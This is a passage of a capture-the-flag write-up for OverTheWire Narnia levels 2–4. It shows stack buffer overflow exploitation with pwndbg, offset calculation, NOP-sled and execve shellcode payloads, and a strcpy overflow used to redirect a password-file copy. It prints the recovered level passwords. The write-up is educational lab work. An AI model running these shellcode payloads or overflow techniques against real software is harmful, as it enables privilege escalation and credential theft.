| HEAP | CODE | DATA | RWX | RODATA                                      ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0                                                                             EBX  0x0                                                                                                                                                                   ECX  0x0                                                                                                                                                                   EDX  0x0  EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0x41414141 ('AAAA')  ESP  0xffffcc60 ◂-- 0x41414141 ('AAAA')  EIP  0x41414141 ('AAAA')  ─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────  Invalid address 0x41414141Calculating EIP OffsetAfter running the program in gdb and providing 1000 A’s as the argument, the EIP register was successfully overwritten to 0x41414141. To find the offset, the cyclic function can be used as follows:  pwndbg&gt; r $(cyclic 1000)                                                                                                                                             [11/205]  Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(cyclic 1000)                                                                                                                                                                               Program received signal SIGSEGV, Segmentation fault.  0x62616169 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0       EBX  0x0       ECX  0x0       EDX  0x0       EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */                                                                                      ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0x62616168 ('haab')  ESP  0xffffcc60 ◂-- 0x6261616a ('jaab')  EIP  0x62616169 ('iaab')  ─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────  Invalid address 0x62616169Observe that the EIP register has changed in value causing the instruction pointer to return to an unexpected address and crashSeeing that the EIP register is now 0x62616169, the offset can now be calculated with the -l flag:  pwndbg&gt; cyclic -l 0x62616169  132Thus, 132 bytes can be passed before overwriting the EIP register. We can view what is inside the stack by accessing the ESP register. This register is responsible for pointing to the top of the stack.How the Buffer Relates to the StackThe buffer is where data is temporarily stored, and it is located in the RAM (random access memory) of the computer. When there is improper validation as to the content and size of the buffer, the program can experience an overflow in which inputted data floods the memory of the program.[7] A visual image of how a buffer overflow attack can overwrite memoryAs more data gets inputted into the buffer, the stored data of the program (located in the stack) gets overwritten in the following order:  Local variables  Saved registers  Return address  Function arguments (parameters)[8] A simplified image on how the buffer relates to the stackWhen a program allocates a fixed number of bytes into the buffer, the memory of the buffer will end up spilling into the EBP (base pointer), ESP (stack pointer), and EIP (instruction pointer) registers. The EIP register will hold the return address, while the ESP register contains the data of the program. The EBP register is typically reserved as a backup for the ESP in case the ESP is modified during execution of a function (note that the EBP register can be overflowed as well).Constructing a PayloadNow with the knowledge of the EIP offset (132 bytes), we can construct a payload that will look like the following:JUNK_BYTE * 132 + ADDRESS_TO_SHELLCODE + NOP_SLED + SHELLCODEIn regards to the payload, it is important to emphasize what is the purpose of a NOP sled and what it is. A NOP sled is a series of NOP (no operation) bytes, which is an instruction that occupies space in memory, but tells the program to not do anything. The purpose of a NOP sled in binary exploitation is to allow a greater leniency when determining the proper address to flood the EIP register with. When the shellcode is put after the NOP sled and the instruction pointer is pointing to somewhere within the bounds of the NOP sled, the program will essentially go through each NOP instruction until it executes the shellcode.Binary ExploitationPOCBefore the attack was conducted on the target machine, the payload was first executed on the attacking box so as to get a better view as to how to correctly format the payload using pwndbg.  pwndbg&gt; r $(python -c "print 'A'*132 +'B'*4 +'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")          Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(python -c "print 'A'*132 +'B'*4 +'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e  \\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")                                                                                                                                   Program received signal SIGSEGV, Segmentation fault.                                                                                                                         0x42424242 in ?? ()                                                                                                                                                          Note how the EIP register was successfully overwritten with 4 B’sAfter executing this payload, we can view where in the EBP register lies the payload:  pwndbg&gt; x/100x $esp-200                                                                                                                                                     0xffffcec8:     0xffffdf8b      0x00000000      0xf7fa6000      0xf7fa6000                                                                                                  0xffffced8:     0xffffcf88      0xf7e14fe5      0xf7fa6d20      0x08048534                                                                                                   0xffffcee8:     0xffffcf04      0x00000000      0xffffcf08      0xf7ffd980            0xffffcef8:     0xf7e14fc5      0x08048494      0x08048534      0xffffcf08                                                                                                   0xffffcf08:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf18:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf28:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffcf38:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffcf48:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf58:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffcf68:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffcf78:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffcf88:     0x41414141      0x42424242      0x90909090      0x90909090  0xffffcf98:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffcfa8:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873  0xffffcfb8:     0x896e6962      0x895350e3      0xcd0bb0e1      0x00000080  0xffffcfc8:     0xf7fa6000      0xf7fa6000      0x00000000      0x6675dc09As we can see, the junk bytes lead all the way to 0xffffcf88, and the return address starts at 0xffffcf88 + 4 which is 0xffffcf8c. The NOP sled then begins at 0xffffcf90, and the shellcode starts at 0xffffcfac. Using this information, we can construct the payload to be the following:  python -c "print 'A'*132 +'\\x98\\xcf\\xff\\xff' \+ '\\x90'*30 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'"The return address points to 0xffffcf98 which is an address within the boundary of the NOP sled. Therefore, this payload should go past each NOP bytes as it eventually gets to the shellcode.  pwndbg&gt; r $(python -c "print 'A'*132 +'\\x98\\xcf\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")          Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(python -c "print 'A'*132 +'\\x98\\xcf\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")  process 5966 is executing new program: /usr/bin/dash  $ whoami  [Attaching after process 5966 fork to child process 5974]  [New inferior 2 (process 5974)]  [Detaching after fork from parent process 5966]  [Inferior 1 (process 5966) detached]  process 5974 is executing new program: /usr/bin/whoami  0xd4ySeeing as the program successfully executed the shellcode, we can now try this same payload ( with the modification of the return address) on the target machine.Exploiting the Binary on the TargetAfter logging into the narnia2 user and running the same payload within gdb we see the following:  narnia2@narnia:/narnia$ gdb ./narnia2 -q                                                                                                                             [37/634]  Reading symbols from ./narnia2...(no debugging symbols found)...done.  (gdb) r $(python -c "print 'A'*132 +'\\x98\\xcf\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'")            Starting program: /narnia/narnia2 $(python -c "print 'A'*132 +'\\x98\\xcf\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0  \\x0b\\xcd\\x80'")    Program received signal SIGSEGV, Segmentation fault.  0xffffcf98 in ?? ()  (gdb) x/100x $esp\-200  0xffffd448:     0xf7e53f7b      0x00000000      0x00000002      0xf7fc5000  0xffffd458:     0xffffd508      0xf7e5b7f6      0xf7fc5d60      0x08048534  0xffffd468:     0xffffd488      0xf7e5b7d0      0xffffd488      0xf7ffd920  0xffffd478:     0xf7e5b7d5      0x08048494      0x08048534      0xffffd488  0xffffd488:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd498:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4a8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4b8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4c8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4d8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4e8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd4f8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd508:     0x41414141      0xffffcf98      0x90909090      0x90909090  0xffffd518:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd528:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873  0xffffd538:     0x896e6962      0x895350e3      0xcd0bb0e1      0xfe790080  0xffffd548:     0xc497b545      0x00000000      0x00000000      0x00000000Here we can see that the junk bytes end at 0xffffd508 and the EIP register is overwritten at 0xffffd50C. The nop sled then begins at 0xffffd510 and the shellcode starts at 0xffffd52c. Therefore, we can modify the payload to point to 0xffffd518 which is within the bounds of the NOP sled and the shellcode will get executed.  narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A'*132 +'\\x18\\xd5\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0  \\x0b\\xcd\\x80'")  Illegal instructionUnfortunately, this payload did not work most likely due to a small shift in the memory address. It is important to note the fact that “Illegal instruction” was outputted instead of “Segmentation fault” which is a strong indicator that the payload is close to successful execution. It is the result of the overwritten EIP register pointing to an address with meaningless assembly code. After tweaking the address a little bit (changing \x18\xd5\xff\xff to \x48\xd5\xff\xff, we get a shell as narnia3:  narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A'*132 +'\\x48\\xd5\\xff\\xff'+'\\x90'*30 +'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0  \\x0b\\xcd\\x80'")  $ whoami  narnia3$ cat /etc/narnia_pass/narnia3  vaequeezeeSource Code  #include &lt;stdio.h&gt;  #include &lt;string.h&gt;  #include &lt;stdlib.h&gt;    int main(int argc, char * argv[]){   char buf[128];   if(argc == 1){       printf("Usage: %s argument\\n", argv[0]);       exit(1);     }   strcpy(buf,argv[1]);   printf("%s", buf);   return 0;  }We can see that this program is vulnerable, as it only expects to receive up to 128 bytes for the buffer, and does not properly check the size of the user’s input.Narnia 3Executing the narnia3 binary we see the following:  narnia3@narnia:/narnia$ ./narnia3  usage, ./narnia3 file, will send contents of file 2 /dev/nullEssentially, the program claims that it will read the contents of a file and write its contents to /dev/null.Attempting to Read Passwords from the Stack PointerThis means that the contents of the file it is reading from will most likely be in the esp register upon reading. We can verify this by first running the program in gdb and setting a breakpoint at the instruction right before the program terminates.     0x08048602 &lt;+247&gt;:   pushl  -0x4(%ebp)                                                0x08048605 &lt;+250&gt;:   call   0x80483f0 &lt;close@plt&gt;                          0x0804860a &lt;+255&gt;:   add    $0x4,%esp    0x0804860d &lt;+258&gt;:   push   $0x1  0x0804860f &lt;+260&gt;:   call   0x80483b0 &lt;exit@plt&gt;  End of assembler dump.  (gdb) b *0x0804860d                          Breakpoint 1 at 0x804860dTo determine where the contents of the inputted file will be located, the file a.txt was created (located in /tmp/test6/) whose contents is filled with 300 A’s.  (gdb) r /tmp/test6/a.txt                                                                Starting program: /narnia/narnia3 /tmp/test6/a.txt                          copied contents of /tmp/test6/a.txt to a safer place... (/dev/null)                                                                                               Breakpoint 1, 0x0804860d in main ()                                                  Viewing the esp register reveals that this string of A’s starts at 0xffffd560.(gdb) x/100x $esp\-100                                                                                                                                                0xffffd4fc:     0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c              0xffffd50c:     0xf7ffd000      0x0804825c      0x00000001      0xf7e187b8              0xffffd51c:     0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc5000  0xffffd52c:     0xf7fe800b      0x00000000      0x00000002      0xf7fc5000              0xffffd53c:     0xffffd5b8      0xf7fee710      0xf7fc6870      0xffffd5b8              0xffffd54c:     0x00000000      0x7fffffbd      0xf7ee930c      0x0804860a  0xffffd55c:     0x00000003      0x41414141      0x41414141      0x41414141              0xffffd56c:     0x41414141      0x41414141      0x41414141      0x41414141              0xffffd57c:     0x00414141      0x706d742f      0x7365742f      0x612f3674            Therefore, when the /etc/narnia_pass/narnia3 file is inputted, we can expect the contents of the file to be around 0xffffd560.  (gdb) r /etc/narnia_pass/narnia3The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /narnia/narnia3 /etc/narnia_pass/narnia3copied contents of /etc/narnia_pass/narnia3 to a safer place... (/dev/null)Breakpoint 1, 0x0804860d in main ()(gdb) x/100x $esp\-100  0xffffd4fc:     0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c  0xffffd50c:     0xf7ffd000      0x0804825c      0x00000001      0xf7e187b8  0xffffd51c:     0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc5000  0xffffd52c:     0xf7fe800b      0x00000000      0x00000002      0xf7fc5000  0xffffd53c:     0xffffd5b8      0xf7fee710      0xf7fc6870      0xffffd5b8  0xffffd54c:     0x00000000      0x7fffffb5      0xf7ee930c      0x0804860a  0xffffd55c:     0x00000003      0x71656176      0x7a656575      0xf70a6565  0xffffd56c:     0xf7fd2e28      0xf7fc5000      0xffffd654      0xf7ffcd00  0xffffd57c:     0x00200000      0x6374652f      0x72616e2f      0x5f61696e  0xffffd58c:     0x73736170      0x72616e2f      0x3361696e      0xffffd600Looking at the output, we can see that the address of the contents of the file matches the expected location of 0xffffd560. The contents of the file are read from right to left in memory (as this is in little endian), and are stored using their respective ascii values in hex. Converting this to ascii reveals that this password is vaequeezee, which matches the password of narnia3. However, attempting this same methodology on /etc/narnia_pass/narnia4 does not work:  (gdb) r /etc/narnia_pass/narnia4  Starting program: /narnia/narnia3 /etc/narnia_pass/narnia4  error opening /etc/narnia_pass/narnia4  [Inferior 1 (process 26687) exited with code 0377]Security Behind SUID DebuggingThe reason this does not work is due to the security risks involved with allowing a user to execute an SUID binary within a debugger. Essentially, if a user was allowed to execute a binary with permissions of another user, then they could easily modify a program to execute what they would like.Debuggers have to execute the ptrace (process trace) function call to trace a function (this is how debugging programs work). This function prevents execve system calls from elevating privileges on the system, as the privilege elevations flags are ignored, effectively making the user have the same privileges as he or she did before debugging. The only way to execute an SUID binary with the permissions of the effective user, is to run the program as root.Binary AnalysisSeeing as reading the narnia4’s password in the memory of the stack pointer was not successful, we can analyze the binary in Ghidra to see how it works and come up with a different methodology for exploitation:  void main(int param_1,undefined4 *param_2)    {   undefined local_5c [32];   char local_3c [32];   undefined4 local_1c;   undefined4 local_18;   undefined4 local_14;   undefined4 local_10;   int local_c;   int local_8;      local_1c = 0x7665642f;   local_18 = 0x6c756e2f;   local_14 = 0x6c;   local_10 = 0; if (param_1 != 2) {     printf("usage, %s file, will send contents of file 2 /dev/null\\n",*param_2);                   /* WARNING: Subroutine does not return */   exit(-1);   }   strcpy(local_3c,(char *)param_2[1]);   local_8 = open((char *)&amp;local_1c,2); if (local_8 &lt; 0) {     printf("error opening %s\\n",&amp;local_1c);                   /* WARNING: Subroutine does not return */   exit(-1);   }   local_c = open(local_3c,0); if (local_c &lt; 0) {     printf("error opening %s\\n",local_3c);                   /* WARNING: Subroutine does not return */   exit(-1);   }   read(local_c,local_5c,0x1f);   write(local_8,local_5c,0x1f);   printf("copied contents of %s to a safer place... (%s)\\n",local_3c,&amp;local_1c);   close(local_c);   close(local_8);                   /* WARNING: Subroutine does not return */ exit(1);  }We can see that the binary is providing 32 bytes to two different unidentified buffers defined as local_5c and local_3c. The program checks if an argument is sent. If not it will provide the usage, otherwise it will perform the strcpy function (a function used to copy strings). This is a dangerous function which can result in buffer overflows. Reading the man page of this function and going to the “Bugs” section, the following description can be read:If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine. Any time a program reads or copies data into a buffer, the program first needs to check that there’s enough space. This may be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.Following the strcpy function are two if statements: one for checking if a file exists, and another for checking if we have valid permissions for opening the file. If the file exists and we have permissions for opening the file, then the read and write functions are executed.Before figuring out how to exploit the binary, we should first understand how it behaves by doing what the program expects:  narnia3@narnia:~$ /narnia/narnia3 /etc/narnia_pass/narnia4  copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)The program can read the narnia4 password file and copy it to /dev/null. However, due to this being the place in linux used for discarding data, we cannot recover the password.Exploiting strcpyGoing back to Ghidra, we can see that the /dev/null device is set to the variable local_1c:If there is a buffer overflow vulnerability we can possibly overwrite this local variable. When inputting many strings followed by the word “test”, we can see that the program returns an error for opening the program, however not all of the A’s that we sent are outputted.  narnia3@narnia:~$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest  error opening AAAAAAAAAAAAtestWe can try to create a file called AAAAAAAAAAAAtest and see how the binary responds.  narnia3@narnia:/tmp$ touch AAAAAAAAAAAAtest  narnia3@narnia:/tmp$ chmod 777 AAAAAAAAAAAAtest  narnia3@narnia:/tmp$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest                                                                                      error opening AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestStrangely, the binary now spits out all the A’s that we inputted. Recall that we found within Ghidra that 32 bytes are being allocated to two unknown buffers. It is possible that one of the buffers is meant for the name of the input file, while the other buffer is meant for the output. This means that upon creating a long-named directory and inputting the full path of a file located within this directory might successfully overwrite the variable allocated for the /dev/null device. This methodology was carried out as follows:  narnia3@narnia:/tmp$ mkdir $(python -c "print 'S'*26")  narnia3@narnia:/tmp$ cd $(python -c "print 'S'*26")  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS$ touch test  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS$ chmod 777 testNote that a directory of 26 S’s was created because /tmp/ is 5 characters and the / at the end of the S directory is one character (6 + 26 = 32 which is the size allocated for the buffer)Executing the full path of the “test” file within this directory proves to successfully overwrite the null device variable:  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSS$ /narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/test  copied contents of /tmp/SSSSSSSSSSSSSSSSSSSSSSSSS/test to a safer place... (test)It follows that if we create a /tmp directory within the current working directory and create a file that is symbolically linked to narnia4’s password file, we can copy his credentials to wherever we specify.  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ /narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials  error opening tmp/credentialsThis error was included to further help in understanding how the binary worksThe error is missing a / at the beginning of the tmp directory. This is because /tmp/ is four characters, S is 26 characters, and the trailing / is one character (which completely fills the 32 bytes allocated for the buffer). Therefore, the string after the trailing / of the S directory is what overwrites the variable for the null device. Creating a directory with 27 S’s fixes this problem (note that the choice of S’s was arbitrary, and any sequence of 27 bytes within the /tmp directory would have worked):  narnia3@narnia:/tmp$ mkdir $(python -c "print 'S'*27")  narnia3@narnia:/tmp$ cd $(python -c "print 'S'*27")  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS$ mkdir tmp  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS$ cd tmp  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ ln -s /etc/narnia_pass/narnia4 credentials  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ /narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials  error opening /tmp/credentials  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ touch /tmp/credentials  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ chmod 777 /tmp/credentials  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ /narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials  copied contents of /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials to a safer place... (/tmp/credentials)  narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ cat /tmp/credentials  thaenohtaiThe password for the narnia4 user was successfully copied to the /tmp directory under the filename of credentials.Source Code  #include &lt;stdio.h&gt;  #include &lt;sys/types.h&gt;  #include &lt;sys/stat.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;unistd.h&gt;  #include &lt;stdlib.h&gt;                                                                                                                                                    #include &lt;string.h&gt;                                                                                                                                                                                                                                                                                                                                     int main(int argc, char **argv){       int  ifd,  ofd;     char ofile[16] = "/dev/null";     char ifile[32];     char buf[32];   if(argc != 2){         printf("usage, %s file, will send contents of file 2 /dev/null\\n",argv[0]);       exit(-1);     }   /* open files */   strcpy(ifile, argv[1]);   if((ofd = open(ofile,O_RDWR)) &lt; 0 ){         printf("error opening %s\\n", ofile);       exit(-1);     }   if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){         printf("error opening %s\\n", ifile);       exit(-1);     }   /* copy from file1 to file2 */   read(ifd, buf, sizeof(buf)-1);     write(ofd,buf, sizeof(buf)-1);     printf("copied contents of %s to a safer place... (%s)\\n",ifile,ofile);   /* close 'em */   close(ifd);     close(ofd);   exit(1);  }We can see from the source code that the program is not checking for the size of the user input before running the strcpy function. The usage of the strcpy function should be avoided as it can result in a buffer overflow vulnerability.  By inputting over 32 bytes to the ifile, the ofile variable (initialized to /dev/null) was overwritten.Narnia 4As the narnia4 user, we can now running the narnia4 binary. However, when executing the binary, nothing happens:  narnia4@narnia:/narnia$ ./narnia4narnia4@narnia:/narnia$Binary AnalysisDownloading this binary and opening it up on Ghidra shows the following code:  undefined4 main(int param_1,int param_2){ size_t __n; char local_108 [256]; int local_8;      local_8 = 0; while (*(int *)(environ + local_8 * 4) != 0) {     __n = strlen(*(char **)(environ + local_8 * 4));   memset(*(void **)(environ + local_8 * 4),0,__n);     local_8 = local_8 + 1;   } if (1 &lt; param_1) {   strcpy(local_108,*(char **)(param_2 + 4));   } return 0;  }The program is allocating 256 bytes to some variable and performing some innocuous operation on it inside the while loop. After doing so, the program runs an if statement which uses the dangerous strcpy function (see Narnia 3).Binary ExploitationWe can attempt to overflow the buffer by sending a large number of bytes in a pattern using pwndbg to determine where the eip offset is:  pwndbg&gt; r $(cyclic 500)                                                                Starting program: /home/0xd4y/business/other/overthewire/narnia/4/narnia4 $(cyclic 500)                                                                                                                                                                               Program received signal SIGSEGV, Segmentation fault.                                  0x63616171 in ?? ()                                                                      pwndbg&gt; cyclic -l 0x63616171                                                                                                                                                  264                                                                                                                                                                          Therefore, we can input a maximum of 264 bytes before overwriting the eip register. Thus, we can do just as we did in Narnia 2, and create a payload that will fill overwrite the eip register with an address that points to shellcode[9]:  pwndbg&gt; r $(python -c "print 'A'*264+'B'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                                                                                                                                                              Starting program: /home/0xd4y/business/other/overthewire/narnia/4/narnia4 $(python -c "print 'A'*264+'B'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x  68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                                                 Program received signal SIGSEGV, Segmentation fault.                                    0x42424242 in ?? ()                                                                                                                                                              pwndbg&gt; x/100x $esp-200                                                                                                                                                        0xffffcdf8:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce08:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce18:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce28:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce38:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce48:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce58:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce68:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce78:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce88:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce98:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcea8:     0x41414141      0x41414141      0x41414141      0x41414141           0xffffceb8:     0x41414141      0x42424242      0x90909090      0x90909090           0xffffcec8:     0x90909090      0x90909090      0x90909090      0x90909090           0xffffced8:     0x90909090      0x90909090      0x90909090      0x90909090           0xffffcee8:     0x90909090      0x90909090      0x90909090      0x90909090           0xffffcef8:     0x90909090      0x90909090      0x90909090      0x90909090           0xffffcf08:     0x90909090      0x90909090      0x90909090      0x90909090           0xffffcf18:     0x90909090      0x90909090      0x90909090      0x99580b6a              0xffffcf28:     0x2d686652      0x52e18970      0x2f68686a      0x68736162           0xffffcf38:     0x6e69622f      0x5152e389      0xcde18953      0x00000080                                                                                                   We can see that the NOP sled starts at 0xffffcec0, and the shellcode starts at 0xffffcf24. So the eip register can point to any address within the boundaries of these two address (the address of 0xffffcf08 was arbitrarily chosen; any address within the nop sled would work):  pwndbg&gt; r $(python -c "print 'A'*264+'\\x08\\xcf\\xff\\xff'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe  3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                                                                                                                                              Starting program: /home/0xd4y/business/other/overthewire/narnia/4/narnia4 $(python -c "print 'A'*264+'\\x08\\xcf\\xff\\xff'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                                                                          Expectedly, using this same methodology on the target machine results in successful exploitation:  (gdb) r $(python -c "print 'A'*264 +'B'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x8  9\\xe1\\xcd\\x80'")                                                                                                                                                              Starting program: /narnia/narnia4 $(python -c "print 'A'*264 +'B'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\  x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")    Program received signal SIGSEGV, Segmentation fault.  0x42424242 in ?? ()  (gdb) x/100x $esp-200  0xffffd378:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd388:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd398:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3a8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3b8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3c8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3d8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3e8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd3f8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd408:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd418:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd428:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd438:     0x41414141      0x42424242      0x90909090      0x90909090  0xffffd448:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd458:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd468:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd478:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd488:     0x90909090      0x90909090      